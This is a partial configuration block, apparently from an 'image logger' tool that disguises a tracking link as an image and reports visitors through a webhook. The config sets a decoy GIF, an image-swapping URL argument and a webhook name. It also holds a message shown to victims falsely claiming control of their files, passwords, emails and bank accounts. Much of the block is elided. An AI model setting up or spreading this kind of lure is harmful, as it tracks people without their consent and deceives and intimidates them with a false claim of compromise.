...
config = {
    ...
    "image": "https://i.imgur.com/f3CYy5x.gif", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "therealreee!", # Set this to the name you want the webhook to have
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "I now control your entire pc/phone files , passwords , emails , banking accounts , etc", # Message to show
